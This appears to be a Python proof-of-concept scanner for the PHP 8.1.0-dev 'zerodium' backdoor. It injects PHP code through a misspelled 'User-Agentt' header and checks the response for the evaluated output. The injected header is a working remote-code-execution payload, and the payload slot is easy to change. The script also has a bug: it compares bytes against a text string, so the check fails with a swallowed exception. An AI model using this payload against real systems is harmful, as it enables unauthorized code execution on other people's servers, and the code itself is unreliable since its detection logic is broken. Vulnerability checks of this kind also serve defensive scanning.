#encoding:utf-8
from email import header


try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/"                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        header = {"User-Agentt": "zerodiumvar_dump(233*233);"}
        req = requests.get(tar + payload,headers=header,timeout=3)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"int(54289)" in req.text ) :          #填写匹配信息
                logging.info(u"[+] {} find php8.1backdoor".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found php8.1backdoor".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found php8.1backdoor".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
